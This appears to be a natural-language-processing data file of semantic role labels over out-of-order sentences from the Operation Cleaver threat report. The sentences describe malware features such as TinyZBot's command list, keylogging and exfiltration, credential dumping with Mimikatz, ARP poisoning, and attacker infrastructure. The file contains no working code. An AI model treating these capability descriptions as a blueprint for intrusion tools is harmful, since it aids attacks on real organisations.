"ARG2": {"text": "from many critical infrastructure companies allowing them to directly affect the systems they run"}}, "allowing": {"ARG0": {"text": "many critical infrastructure companies"}, "V": {"text": "allowing", "index": 44}, "ARG1": {"text": "them to directly affect the systems they run"}}, "affect": {"ARG0": {"text": "them"}, "ARGM-MNR": {"text": "directly"}, "V": {"text": "affect", "index": 48}, "ARG1": {"text": "the systems they run"}}, "run": {"ARG1": {"text": "the systems"}, "ARG0": {"text": "they"}, "V": {"text": "run", "index": 52}}}, "\n\n  The following is a list of supported commands that TinyZBot responds to:\n<list>     \n  COPY                                        \n  REPLACE                                     \n  DELETE                                      \n  UPLOAD                                      \n  FUPLOAD                                     \n  CLEARFILES                                  \n  CLEAROUPUTFOLDER                            \n  SAVECONFIG                                  \n  SAVETOCFGFILE                               \n  RESTART                       \n  RestartForce\n  KILL           \n  DEEPKILL       \n  EXIT           \n  EXITFORCE      \n  RUNAVDETECTOR  \n  RUNWAIT        \n  RUNCMD         \n  UCMD           \n  GETINFO        \n  GETSCREENSHOTHQ\n  GETSCREENSHOT   \n  CREATEUPLOADLIST\n  FORCERESTART    \n  FORCEEXIT       \n  UNLOADMODULE    \n  RELOADMODULE    \n  LOADMODULE      \n  UNLOADM         \n  RELOADM         \n  REMOVEM\n  UNLOADALL\n  RELOADALL\n  ADDSEC\n  REMSEC\n  ADDKV\n  CHGKV\n  REMKV\n  ADDK\n  REMOVEK\n</list>\n\n  Commands such as GETINFO are often run on newly infected systems, as they decide whether\n  the infection has hit the correct target": {"is": {"ARG1": {"text": "The following"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "a list of supported commands that TinyZBot responds to"}}, "supported": {"V": {"text": "supported", "index": 6}, "ARG1": {"text": "commands"}}, "responds": {"ARG0": {"text": "TinyZBot"}, "V": {"text": "responds", "index": 10}, "ARG1": {"text": "to"}}, "are": {"V": {"text": "are", "index": 17}}, "run": {"ARG1": {"text": "Commands such as GETINFO"}, "ARGM-TMP": {"text": "often"}, "V": {"text": "run", "index": 19}, "ARGM-LOC": {"text": "on newly infected systems"}, "ARGM-ADV": {"text": "as they decide whether the infection has hit the correct target"}}, "infected": {"ARGM-TMP": {"text": "newly"}, "V": {"text": "infected", "index": 22}, "ARG1": {"text": "systems"}}, "decide": {"ARG0": {"text": "they"}, "V": {"text": "decide", "index": 27}, "ARG1": {"text": "whether the infection has hit the correct target"}}, "has": {"V": {"text": "has", "index": 31}}, "hit": {"ARG0": {"text": "the infection"}, "V": {"text": "hit", "index": 32}, "ARG1": {"text": "the correct target"}}}, "\n \u2022\t Customized private tools with functions that include ARP poisoning, encryption, credential\n    dumping, ASP.NET shells, web backdoors, process enumeration, WMI querying, HTTP and\n    SMB communications, network interface sniffing, and keystroke logging": {"Customized": {"V": {"text": "Customized", "index": 1}, "ARG1": {"text": "private tools with functions that include ARP poisoning , encryption , credential dumping"}}, "include": {"ARG2": {"text": "\u2022 Customized private tools with functions"}, "R-ARG2": {"text": "that"}, "V": {"text": "include", "index": 7}, "ARG1": {"text": "ARP poisoning , encryption , credential dumping , ASP.NET shells , web backdoors , process enumeration , WMI querying , HTTP and SMB communications , network interface sniffing , and keystroke logging"}}, "keystroke": {"V": {"text": "keystroke", "index": 38}, "ARG1": {"text": "logging"}}, "logging": {"ARG1": {"text": "keystroke"}, "V": {"text": "logging", "index": 39}}}, " They gained access to PayPal\n and Go Daddy credentials allowing them to make fraudulent purchases and allowed unfettered\n access to the victim\u2019s domains": {"gained": {"ARG0": {"text": "They"}, "V": {"text": "gained", "index": 1}, "ARG1": {"text": "access to PayPal"}}, "Go": {"ARG0": {"text": "They"}, "V": {"text": "Go", "index": 6}, "ARG1": {"text": "Daddy credentials"}, "ARGM-ADV": {"text": "allowing them to make fraudulent purchases"}}, "allowing": {"ARG0": {"text": "Daddy credentials"}, "V": {"text": "allowing", "index": 9}, "ARG1": {"text": "them to make fraudulent purchases and allowed unfettered access to the victim \u2019s domains"}}, "make": {"ARG0": {"text": "them"}, "V": {"text": "make", "index": 12}, "ARG1": {"text": "fraudulent purchases"}}, "allowed": {"ARG0": {"text": "them"}, "V": {"text": "allowed", "index": 16}, "ARG1": {"text": "unfettered access to the victim \u2019s domains"}}}, " Clipboard monitoring\n  code was added, but not invoked": {"was": {"V": {"text": "was", "index": 3}}, "added": {"ARG1": {"text": "Clipboard monitoring code"}, "V": {"text": "added", "index": 4}}, "invoked": {"ARG1": {"text": "Clipboard monitoring code"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "invoked", "index": 8}}}, "\nThe command and control still supports upgrading, downloading, and executing of applications, as\nwell as executing batch scripts": {"supports": {"ARG0": {"text": "The command and control"}, "ARGM-TMP": {"text": "still"}, "V": {"text": "supports", "index": 5}, "ARG1": {"text": "upgrading , downloading , and executing of applications , as well as executing batch scripts"}}, "upgrading": {"V": {"text": "upgrading", "index": 6}}, "downloading": {"ARG0": {"text": "The command and control"}, "V": {"text": "downloading", "index": 8}}, "executing": {"V": {"text": "executing", "index": 18}, "ARG1": {"text": "batch scripts"}}}, "\n</section>\n\n<section>\n<heading>zhMimikatz and MimikatzWrapper</heading>\nTwo similar applications were developed by Operation Cleaver in order automate the execution\nof Mimikatz": {"were": {"V": {"text": "were", "index": 3}}, "developed": {"ARG1": {"text": "Two similar applications"}, "V": {"text": "developed", "index": 4}, "ARG0": {"text": "by Operation Cleaver"}, "ARGM-LOC": {"text": "in order automate the execution of Mimikatz"}}, "automate": {"ARG0": {"text": "order"}, "V": {"text": "automate", "index": 10}, "ARG1": {"text": "the execution of Mimikatz"}}}, "\n</section>\n\n<section>\n  <heading>Jasus</heading>\n                                 \n  Jasus is an ARP cache poisoner developed by the Operation Cleaver team": {"is": {"ARG1": {"text": "Jasus"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "an ARP cache poisoner developed by the Operation Cleaver team"}}, "developed": {"ARG1": {"text": "an ARP cache poisoner"}, "V": {"text": "developed", "index": 6}, "ARG0": {"text": "by the Operation Cleaver team"}}}, "\n\n  When a command is received from the server, the results are stored in a central location on disk\n  that the PVZ tools utilize": {"is": {"V": {"text": "is", "index": 3}}, "received": {"ARGM-TMP": {"text": "When"}, "ARG1": {"text": "a command"}, "V": {"text": "received", "index": 4}, "ARG2": {"text": "from the server"}}, "are": {"V": {"text": "are", "index": 11}}, "stored": {"ARGM-TMP": {"text": "When a command is received from the server"}, "ARG1": {"text": "the results"}, "V": {"text": "stored", "index": 12}, "ARGM-LOC": {"text": "in a central location on disk that the PVZ tools utilize"}}, "utilize": {"ARG0": {"text": "the PVZ tools"}, "V": {"text": "utilize", "index": 23}}}, " Fully compromised VPN credentials meant their entire remote access infrastructure\n and supply chain was under the control of the Cleaver team, allowing permanent persistence\n under compromised credentials": {"compromised": {"ARGM-MNR": {"text": "Fully"}, "V": {"text": "compromised", "index": 1}}, "meant": {"ARG0": {"text": "Fully compromised VPN credentials"}, "V": {"text": "meant", "index": 4}, "ARG1": {"text": "their entire remote access infrastructure and supply chain was under the control of the Cleaver team , allowing permanent persistence under compromised credentials"}}, "was": {"ARG1": {"text": "their entire remote access infrastructure and supply chain"}, "V": {"text": "was", "index": 13}, "ARG2": {"text": "under the control of the Cleaver team"}, "ARGM-ADV": {"text": "allowing permanent persistence under compromised credentials"}}, "allowing": {"V": {"text": "allowing", "index": 22}, "ARG1": {"text": "permanent persistence under compromised credentials"}}, "compromised_2": {"V": {"text": "compromised", "index": 26}, "ARG1": {"text": "credentials"}}}, " The attackers targeted research\n efforts, student information, student housing, and financial aid systems": {"targeted": {"ARG0": {"text": "The attackers"}, "V": {"text": "targeted", "index": 2}, "ARG1": {"text": "research efforts , student information , student housing , and financial aid systems"}}}, " A method was added to detect what security related\n  software is installed": {"was": {"V": {"text": "was", "index": 2}}, "added": {"ARG1": {"text": "A method"}, "V": {"text": "added", "index": 3}, "ARGM-PRP": {"text": "to detect what security related software is installed"}}, "detect": {"ARG0": {"text": "A method"}, "V": {"text": "detect", "index": 5}, "ARG1": {"text": "what security related software is installed"}}, "related": {"V": {"text": "related", "index": 8}, "ARG2": {"text": "software"}}, "is": {"ARG1": {"text": "security related software"}, "V": {"text": "is", "index": 10}, "ARG2": {"text": "installed"}}, "installed": {"R-ARG1": {"text": "what"}, "ARG1": {"text": "security related software"}, "V": {"text": "installed", "index": 11}}}, " The email data exfiltration method also underwent modification\n to be activated at a scheduled interval": {"underwent": {"ARG1": {"text": "The email data exfiltration method"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "underwent", "index": 6}, "ARG2": {"text": "modification"}, "ARGM-PRD": {"text": "to be activated at a scheduled interval"}}, "be": {"V": {"text": "be", "index": 9}}, "activated": {"ARG1": {"text": "The email data exfiltration"}, "V": {"text": "activated", "index": 10}, "ARGM-MNR": {"text": "at a scheduled interval"}}, "scheduled": {"V": {"text": "scheduled", "index": 13}, "ARG3": {"text": "interval"}}}, "\n  menrad(dot)de/js/jquery/default.aspx and the command and control protocol only uses\n  HTTP": {"uses": {"ARG0": {"text": "protocol"}, "ARGM-ADV": {"text": "only"}, "V": {"text": "uses", "index": 14}, "ARG1": {"text": "HTTP"}}}, " This data could enable them, or affiliated organizations,\n to target and potentially sabotage ICS and SCADA environments with ease": {"could": {"V": {"text": "could", "index": 2}}, "enable": {"ARG0": {"text": "This data"}, "ARGM-MOD": {"text": "could"}, "V": {"text": "enable", "index": 3}, "ARG2": {"text": "them , or affiliated organizations ,"}, "ARG1": {"text": "to target and potentially sabotage ICS and SCADA environments with ease"}}, "affiliated": {"V": {"text": "affiliated", "index": 7}, "ARG1": {"text": "organizations"}}, "target": {"ARG0": {"text": "them , or affiliated organizations ,"}, "V": {"text": "target", "index": 11}, "ARGM-MNR": {"text": "with ease"}}, "sabotage": {"ARG0": {"text": "them , or affiliated organizations"}, "ARGM-ADV": {"text": "potentially"}, "V": {"text": "sabotage", "index": 14}, "ARG1": {"text": "ICS"}}}, " The file is downloaded Base64-encoded inside of the SOAP response": {"is": {"ARG1": {"text": "The file"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "downloaded Base64-encoded inside of the SOAP response"}}, "downloaded": {"ARG1": {"text": "The file"}, "V": {"text": "downloaded", "index": 3}, "ARGM-LOC": {"text": "inside of the SOAP response"}}, "Base64-encoded": {"V": {"text": "Base64-encoded", "index": 4}, "ARG2": {"text": "inside of the SOAP response"}}}, "\n\nThe PVZ tool chain includes a variety of functionality, such as HTTP command and control\ncommunications with an ASPX server-side component, a denial of service tool they developed, and\nthe public project named XYNTService used to run ordinary applications as services": {"includes": {"ARG2": {"text": "The PVZ tool chain"}, "V": {"text": "includes", "index": 4}, "ARG1": {"text": "a variety of functionality , such as HTTP command and control communications with an ASPX server - side component , a denial of service tool they developed , and the public project named XYNTService used to run ordinary applications as services"}}, "developed": {"ARG1": {"text": "a denial of service tool"}, "ARG0": {"text": "they"}, "V": {"text": "developed", "index": 31}}, "named": {"ARG1": {"text": "the public project"}, "V": {"text": "named", "index": 37}, "ARG2": {"text": "XYNTService"}}, "used": {"ARG0": {"text": "the"}, "V": {"text": "used", "index": 39}, "ARG2": {"text": "to run ordinary applications as services"}}, "run": {"ARG0": {"text": "the public project named XYNTService"}, "V": {"text": "run", "index": 41}, "ARG1": {"text": "ordinary applications as services"}}}, " The tool chain is minimized\ndown to a command and control communications, keystroke logging, and clipboard monitoring": {"is": {"V": {"text": "is", "index": 3}}, "minimized": {"ARG1": {"text": "The tool chain"}, "V": {"text": "minimized", "index": 4}, "ARGM-MNR": {"text": "to a command and control communications , keystroke logging , and clipboard monitoring"}}, "logging": {"ARG1": {"text": "keystroke"}, "V": {"text": "logging", "index": 14}}}, " This allowed the attackers to use\ninfrastructure that was not theirs to exfiltrate information": {"allowed": {"ARG0": {"text": "This"}, "V": {"text": "allowed", "index": 1}, "ARG1": {"text": "the attackers to use infrastructure that was not theirs to exfiltrate information"}}, "use": {"ARG0": {"text": "the attackers"}, "V": {"text": "use", "index": 5}, "ARG1": {"text": "infrastructure that was not theirs"}, "ARGM-PRP": {"text": "to exfiltrate information"}}, "was": {"ARG1": {"text": "the attackers to use infrastructure"}, "R-ARG1": {"text": "that"}, "V": {"text": "was", "index": 8}, "ARGM-NEG": {"text": "not"}, "ARG2": {"text": "theirs"}}, "exfiltrate": {"V": {"text": "exfiltrate", "index": 12}, "ARG1": {"text": "information"}}}, " WndTest installs as a service and has been observed attempting to\nimpersonate Adobe Report Service": {"installs": {"ARG0": {"text": "WndTest"}, "V": {"text": "installs", "index": 1}, "ARGM-PRD": {"text": "as a service"}}, "has": {"V": {"text": "has", "index": 6}}, "been": {"V": {"text": "been", "index": 7}}, "observed": {"V": {"text": "observed", "index": 8}, "ARG1": {"text": "attempting to impersonate Adobe Report Service"}}, "attempting": {"ARG0": {"text": "WndTest installs as a service"}, "V": {"text": "attempting", "index": 9}, "ARG1": {"text": "to impersonate Adobe Report Service"}}, "impersonate": {"ARG0": {"text": "WndTest installs as a service and"}, "V": {"text": "impersonate", "index": 11}, "ARG1": {"text": "Adobe Report Service"}}}, " Messages were sent using an open SMTP relay at BeyondSys.com with\nthe sender email address dyanachear(at)beyondsys.com": {"were": {"V": {"text": "were", "index": 1}}, "sent": {"ARG1": {"text": "Messages"}, "V": {"text": "sent", "index": 2}, "ARGM-MNR": {"text": "using an open SMTP relay/ with the sender email address dyanachear(at)beyondsys.com"}, "ARG2": {"text": "at BeyondSys.com"}}, "using": {"ARG0": {"text": "Messages"}, "V": {"text": "using", "index": 3}, "ARG1": {"text": "an open SMTP relay at BeyondSys.com"}, "ARG2": {"text": "with the sender email address dyanachear(at)beyondsys.com"}}}, " Recent versions use the resume-\n  based methods reported in the Initial Compromise sections": {"use": {"ARG0": {"text": "Recent versions"}, "V": {"text": "use", "index": 2}, "ARG1": {"text": "the resume- based methods reported in the Initial Compromise sections"}}, "based": {"V": {"text": "based", "index": 5}, "ARG1": {"text": "methods"}}, "reported": {"ARG1": {"text": "the resume- based methods"}, "V": {"text": "reported", "index": 7}, "ARGM-LOC": {"text": "in the Initial Compromise sections"}}}, " SOAP traffic could easily be considered benign traffic, as it is not commonly seen in malware": {"could": {"V": {"text": "could", "index": 2}}, "be": {"V": {"text": "be", "index": 4}}, "considered": {"ARGM-MOD": {"text": "could"}, "ARGM-MNR": {"text": "easily"}, "V": {"text": "considered", "index": 5}, "ARG1": {"text": "benign traffic"}, "ARGM-CAU": {"text": "as it is not commonly seen in malware"}}, "is": {"V": {"text": "is", "index": 11}}, "seen": {"ARG1": {"text": "it"}, "ARGM-NEG": {"text": "not"}, "ARGM-ADV": {"text": "commonly"}, "V": {"text": "seen", "index": 14}, "ARGM-LOC": {"text": "in malware"}}}, " If it is unable to connect to the Internet,\n it will display a window to input proxy information": {"is": {"V": {"text": "is", "index": 2}, "ARG2": {"text": "unable"}, "ARG1": {"text": "to connect to the Internet"}}, "connect": {"V": {"text": "connect", "index": 5}, "ARG1": {"text": "to the Internet"}}, "will": {"V": {"text": "will", "index": 11}}, "display": {"ARGM-ADV": {"text": "If it is unable to connect to the Internet"}, "ARG2": {"text": "it"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "display", "index": 12}, "ARG1": {"text": "a window to input proxy information"}}, "input": {"ARG0": {"text": "a window"}, "V": {"text": "input", "index": 16}, "ARG1": {"text": "proxy information"}}}, "\n</section>\n\n<section>\n  <heading>zhMimikatz</heading>\n  zhMimikatz executes the correct version of Mimikatz for the current system, and parses the results\n  for any cached credentials": {"executes": {"ARG0": {"text": "zhMimikatz"}, "V": {"text": "executes", "index": 1}, "ARG1": {"text": "the correct version of Mimikatz"}, "ARG3": {"text": "for the current system"}}, "parses": {"ARG0": {"text": "zhMimikatz"}, "V": {"text": "parses", "index": 13}, "ARG1": {"text": "the results for any cached credentials"}}}, "\n  \n  When a positive result has been achieved, it will create a copy of itself with a modified\n  configuration stored as a PE resource, then send and execute the copy utilizing PsExec": {"has": {"V": {"text": "has", "index": 4}}, "been": {"V": {"text": "been", "index": 5}}, "achieved": {"ARGM-TMP": {"text": "When"}, "ARG1": {"text": "a positive result"}, "V": {"text": "achieved", "index": 6}}, "will": {"V": {"text": "will", "index": 9}}, "create": {"ARGM-TMP": {"text": "When a positive result has been achieved"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "create", "index": 10}, "ARG1": {"text": "a copy of itself"}, "ARGM-MNR": {"text": "with a modified configuration stored as a PE resource"}}, "modified": {"V": {"text": "modified", "index": 17}, "ARG1": {"text": "configuration"}}, "stored": {"ARG1": {"text": "a modified configuration"}, "V": {"text": "stored", "index": 19}, "ARGM-PRD": {"text": "as a PE resource"}}, "send": {"ARGM-TMP": {"text": "When a positive result has been achieved/ then"}, "ARG0": {"text": "it"}, "V": {"text": "send", "index": 26}, "ARG1": {"text": "the copy utilizing PsExec"}}, "execute": {"ARGM-TMP": {"text": "When a positive result has been achieved/ then"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "execute", "index": 28}, "ARG1": {"text": "the copy utilizing PsExec"}}, "utilizing": {"ARG0": {"text": "the copy"}, "V": {"text": "utilizing", "index": 31}, "ARG1": {"text": "PsExec"}}}, " This can involve launching attacks from the\ncompromised computer, or simply abusing access once it has been gained": {"can": {"V": {"text": "can", "index": 1}}, "involve": {"ARG2": {"text": "This"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "involve", "index": 2}, "ARG1": {"text": "launching attacks from the compromised computer , or simply abusing access once it has been gained"}}, "launching": {"ARG0": {"text": "This"}, "V": {"text": "launching", "index": 3}, "ARG1": {"text": "attacks"}, "ARGM-MNR": {"text": "from the compromised computer"}}, "compromised": {"V": {"text": "compromised", "index": 7}, "ARG1": {"text": "computer"}}, "abusing": {"ARG0": {"text": "This"}, "ARGM-ADV": {"text": "simply"}, "V": {"text": "abusing", "index": 12}, "ARG1": {"text": "access"}, "ARGM-TMP": {"text": "once it has been gained"}}, "has": {"V": {"text": "has", "index": 16}}, "been": {"V": {"text": "been", "index": 17}}, "gained": {"ARG1": {"text": "it"}, "V": {"text": "gained", "index": 18}}}, " This allows them\n to easily connect to RDP servers inside the networks of their victims": {"allows": {"ARG0": {"text": "This"}, "V": {"text": "allows", "index": 1}, "ARG1": {"text": "them to easily connect to RDP servers inside the networks of their victims"}}, "connect": {"ARG0": {"text": "them"}, "ARGM-MNR": {"text": "easily"}, "V": {"text": "connect", "index": 5}, "ARG1": {"text": "to RDP servers inside the networks of their victims"}}}, "                                                                    \n</caption>\n</section>\n\n<section>\n<heading>ATTACKER IP ADDRESSES</heading>\nOver the course of multiple incident response engagements related to Operation Cleaver, we\nwere able to identify a small set of IP addresses which were commonly used during the initial\nstages of an attack": {"related": {"ARG1": {"text": "multiple incident response engagements"}, "V": {"text": "related", "index": 8}, "ARG2": {"text": "to Operation Cleaver"}}, "were": {"ARG1": {"text": "we"}, "V": {"text": "were", "index": 14}, "ARG2": {"text": "able to identify a small set of IP addresses which were commonly used during the initial stages of an attack"}}, "identify": {"ARG0": {"text": "we"}, "V": {"text": "identify", "index": 17}, "ARG1": {"text": "a small set of IP addresses which were commonly used during the initial stages of an attack"}}, "were_2": {"V": {"text": "were", "index": 25}}, "used": {"ARG1": {"text": "IP addresses"}, "R-ARG1": {"text": "which"}, "ARGM-ADV": {"text": "commonly"}, "V": {"text": "used", "index": 27}, "ARGM-TMP": {"text": "during the initial stages of an attack"}}}, " The\n  backdoor additionally replaced the original malicious executable with an appropriately named\n  image file and padded the image file with null bytes in order to mirror the original file size": {"replaced": {"ARG2": {"text": "The backdoor/ bytes in order to mirror the original file size"}, "V": {"text": "replaced", "index": 3}, "ARG1": {"text": "the original malicious executable"}, "ARGM-MNR": {"text": "with an appropriately named image file and padded the image file with null"}}, "named": {"ARGM-MNR": {"text": "appropriately"}, "V": {"text": "named", "index": 11}, "ARG1": {"text": "image file"}}, "padded": {"V": {"text": "padded", "index": 15}, "ARG1": {"text": "the image file with null bytes"}, "ARGM-PRP": {"text": "in order to mirror the original file size"}}, "mirror": {"V": {"text": "mirror", "index": 25}, "ARG1": {"text": "the original file size"}}}, " Its\n  main purpose is to create a channel that is capable of transporting information over the network": {"is": {"ARG1": {"text": "Its main purpose"}, "V": {"text": "is", "index": 3}, "ARG2": {"text": "to create a channel that is capable of transporting information over the network"}}, "create": {"V": {"text": "create", "index": 5}, "ARG1": {"text": "a channel that is capable of transporting information over the network"}}, "is_2": {"ARG1": {"text": "a channel"}, "R-ARG1": {"text": "that"}, "V": {"text": "is", "index": 9}, "ARG2": {"text": "capable of transporting information over the network"}}, "transporting": {"ARG0": {"text": "a channel"}, "R-ARG0": {"text": "that"}, "V": {"text": "transporting", "index": 12}, "ARG1": {"text": "information"}, "ARG2": {"text": "over the network"}}}, " This FTP upload functionality points\n to the command and control server, and is invoked by a command in the SOAP command and\n control channel": {"upload": {"ARG0": {"text": "This FTP"}, "V": {"text": "upload", "index": 2}, "ARGM-MNR": {"text": "functionality points"}, "ARGM-LOC": {"text": "to the command and control server"}}, "is": {"ARG1": {"text": "This FTP"}, "V": {"text": "is", "index": 13}, "ARG2": {"text": "invoked by a command in the SOAP command and control channel"}}, "invoked": {"ARG1": {"text": "This FTP"}, "V": {"text": "invoked", "index": 14}, "ARG0": {"text": "by a command in the SOAP command and control channel"}}}, " The primary positive attribute\n  of Jasus is its poor detection ratio by the antivirus industry": {"is": {"ARG1": {"text": "The primary positive attribute of Jasus"}, "V": {"text": "is", "index": 6}, "ARG2": {"text": "its poor detection ratio by the antivirus industry"}}}, " The\n  DELETE command then requests that the file be deleted from the infected system": {"requests": {"ARG0": {"text": "The DELETE command"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "requests", "index": 4}, "ARG1": {"text": "that the file be deleted from the infected system"}}, "be": {"V": {"text": "be", "index": 8}}, "deleted": {"ARG1": {"text": "the file"}, "V": {"text": "deleted", "index": 9}, "ARG2": {"text": "from the infected system"}}}, "\n   \n  Csext also has email functionality similar to TinyZBot": {"has": {"ARG0": {"text": "Csext"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "has", "index": 2}, "ARG1": {"text": "email functionality similar to TinyZBot"}}}, " Multiple domains were\nregistered in order to make the download sites seem more\nrealistic": {"were": {"V": {"text": "were", "index": 2}}, "registered": {"ARG1": {"text": "Multiple domains"}, "V": {"text": "registered", "index": 3}, "ARGM-PRP": {"text": "in order to make the download sites"}}, "make": {"V": {"text": "make", "index": 7}, "ARG1": {"text": "the download sites"}}, "seem": {"V": {"text": "seem", "index": 11}, "ARG1": {"text": "more realistic"}}}, " The following is a list of supported features:\n<list>\n  \u2022   SMTP exfiltration\n  \u2022   Log keystrokes\n  \u2022   Monitor clipboard activity\n  \u2022   Enable a SOAP-based command and control channel\n  \u2022   Self-updating\n  \u2022   Download and execute arbitrary code\n  \u2022   Capture screenshots        \n  \u2022   Extract saved passwords for Internet Explorer\n  \u2022   Install as a service\n  \u2022   Establish persistence by shortcut in startup folder\n  \u2022   Provide unique malware campaign identifiers for tracking and control purposes\n  \u2022   Deceptive execution methods\n  \u2022   Dynamic backdoor configuration\n  \u2022   FTP exfiltration\n  \u2022   Security software detection\n  \u2022   Ability to disable Avira antivirus\n  \u2022   Ability to modify PE resources\n  \u2022   Dynamic plugin structure\n</list>\n</section>\n<footer>47</footer>\n\f \n<header>\nOPERATION\nCLEAVER                                                                                                                               <figure>5468696e6b204576696c2c20446f20476f6f64</figure>\n\n</header>\n\n<section>\n<heading>TinyZBot Command and Control Protocol</heading>\n\nThe command and control mechanism for TinyZBot utilizes SOAP communicating over HTTP": {"is": {"ARG1": {"text": "The following"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "a list of supported features"}, "C-ARG1": {"text": "The command and control mechanism for TinyZBot utilizes SOAP communicating over HTTP"}}, "supported": {"V": {"text": "supported", "index": 6}, "ARG1": {"text": "features"}}, "utilizes": {"ARG0": {"text": "The command and control mechanism for TinyZBot"}, "V": {"text": "utilizes", "index": 16}, "ARG1": {"text": "SOAP communicating over HTTP"}}, "communicating": {"ARG0": {"text": "The command and control mechanism for TinyZBot"}, "ARG1": {"text": "SOAP/ over HTTP"}, "V": {"text": "communicating", "index": 18}}}, " The level of access seemed ubiquitous: Active Directory domains\n were fully compromised, along with entire Cisco Edge switches, routers, and internal networking\n infrastructure": {"seemed": {"V": {"text": "seemed", "index": 4}, "ARG1": {"text": "ubiquitous"}}, "were": {"V": {"text": "were", "index": 10}}, "compromised": {"ARG1": {"text": "Active Directory domains"}, "ARGM-EXT": {"text": "fully"}, "V": {"text": "compromised", "index": 12}, "ARGM-COM": {"text": "along with entire Cisco Edge switches , routers , and internal networking infrastructure"}}, "switches": {"ARG0": {"text": "entire Cisco"}, "ARG1": {"text": "Edge"}, "V": {"text": "switches", "index": 19}}}, " To date it has successfully evaded detection by existing security\n  technologies": {"has": {"V": {"text": "has", "index": 3}}, "evaded": {"ARGM-TMP": {"text": "To date"}, "ARG0": {"text": "it"}, "ARGM-MNR": {"text": "successfully"}, "V": {"text": "evaded", "index": 5}, "ARG1": {"text": "detection by existing security technologies"}}, "existing": {"V": {"text": "existing", "index": 8}, "ARG1": {"text": "security technologies"}}}, " Once this is complete, it\n  then continues to scan a set of configured IP addresses on the local subnet to determine which\n  IP addresses have SMB related ports open": {"is": {"ARG1": {"text": "this"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "complete"}}, "continues": {"ARGM-TMP": {"text": "Once this is complete/ then"}, "ARG0": {"text": "it"}, "V": {"text": "continues", "index": 7}, "ARG1": {"text": "to scan a set of configured IP addresses on the local subnet to determine which IP addresses have SMB related ports open"}}, "scan": {"ARG0": {"text": "it"}, "V": {"text": "scan", "index": 9}, "ARG1": {"text": "a set of configured IP addresses on the local subnet"}, "ARGM-PRP": {"text": "to determine which IP addresses have SMB related ports open"}}, "configured": {"V": {"text": "configured", "index": 13}, "ARG1": {"text": "IP addresses"}}, "determine": {"V": {"text": "determine", "index": 21}, "ARG1": {"text": "which IP addresses have SMB related ports open"}}, "have": {"ARG0": {"text": "which IP addresses"}, "V": {"text": "have", "index": 25}}}, "\n\nThe following IP addresses hosted FTP servers that were used in the infection of targets or in\nthe exfiltration of information": {"hosted": {"ARG0": {"text": "The following IP addresses"}, "V": {"text": "hosted", "index": 4}, "ARG1": {"text": "FTP servers that were used in the infection of targets or in the exfiltration of information"}}, "were": {"V": {"text": "were", "index": 8}}, "used": {"ARG1": {"text": "FTP"}, "R-ARG1": {"text": "that"}, "V": {"text": "used", "index": 9}, "ARGM-TMP": {"text": "in the"}, "ARG2": {"text": "infection of targets or in the exfiltration of information"}}}, " This feature can be abused to enable a reverse connecting shell, which can be\nused to remotely control a target": {"can": {"V": {"text": "can", "index": 2}}, "be": {"V": {"text": "be", "index": 3}}, "abused": {"ARG1": {"text": "This feature"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "abused", "index": 4}, "ARGM-PRP": {"text": "to enable a reverse connecting shell , which can be used to remotely control a target"}}, "enable": {"V": {"text": "enable", "index": 6}, "ARG1": {"text": "a reverse connecting shell , which can be used to remotely control a target"}}, "connecting": {"V": {"text": "connecting", "index": 9}, "ARG1": {"text": "shell"}}, "can_2": {"V": {"text": "can", "index": 13}}, "be_2": {"ARG1": {"text": "a reverse connecting shell"}, "R-ARG1": {"text": "which"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "be", "index": 14}}, "used": {"ARG1": {"text": "a reverse connecting shell"}, "R-ARG1": {"text": "which"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "used", "index": 15}, "ARG2": {"text": "to remotely control a target"}}, "control": {"ARGM-EXT": {"text": "remotely"}, "V": {"text": "control", "index": 18}, "ARG1": {"text": "a target"}}}, " Operation Cleaver has a strong focus on stealing\n  confidential/privileged information, and they have utilized a few methods in order to facilitate this\n  objective": {"has": {"ARG0": {"text": "Operation Cleaver"}, "V": {"text": "has", "index": 2}, "ARG1": {"text": "a strong focus on stealing confidential / privileged information"}}, "stealing": {"V": {"text": "stealing", "index": 7}, "ARG1": {"text": "confidential / privileged information"}}, "have": {"V": {"text": "have", "index": 15}}, "utilized": {"ARG0": {"text": "they"}, "V": {"text": "utilized", "index": 16}, "ARG1": {"text": "a few methods"}, "ARGM-PRP": {"text": "in order to facilitate this objective"}}, "facilitate": {"V": {"text": "facilitate", "index": 23}, "ARG1": {"text": "this objective"}}}, "\n\n\n<figure></figure>\n\n                       <caption>Figure 19: GET request to www.microsoft.com fakes the r\u00e9sum\u00e9 submission.</caption>\n        \n  When the victim hits submit, the r\u00e9sum\u00e9 submitter does a GET request to microsoft.com in order\n  to make it seem like it is submitting something, then claims success": {"hits": {"ARGM-TMP": {"text": "When"}, "ARG0": {"text": "the victim"}, "V": {"text": "hits", "index": 3}, "ARG1": {"text": "submit"}}, "submit": {"ARGM-TMP": {"text": "When"}, "ARG0": {"text": "the victim hits"}, "V": {"text": "submit", "index": 4}}, "does": {"ARGM-TMP": {"text": "When the victim hits submit"}, "ARG0": {"text": "the r\u00e9sum\u00e9 submitter"}, "V": {"text": "does", "index": 9}, "ARG1": {"text": "a GET request to microsoft.com"}, "ARGM-PRP": {"text": "in order to make it seem like it is submitting something"}}, "GET": {"V": {"text": "GET", "index": 11}, "ARG1": {"text": "request"}}, "make": {"V": {"text": "make", "index": 18}, "ARG1": {"text": "it seem like it is submitting something"}}, "seem": {"V": {"text": "seem", "index": 20}, "ARG1": {"text": "like it is submitting something"}}, "is": {"V": {"text": "is", "index": 23}}, "submitting": {"ARG0": {"text": "it"}, "V": {"text": "submitting", "index": 24}, "ARG1": {"text": "something"}}, "claims": {"ARGM-TMP": {"text": "then"}, "V": {"text": "claims", "index": 28}, "ARG1": {"text": "success"}}}, 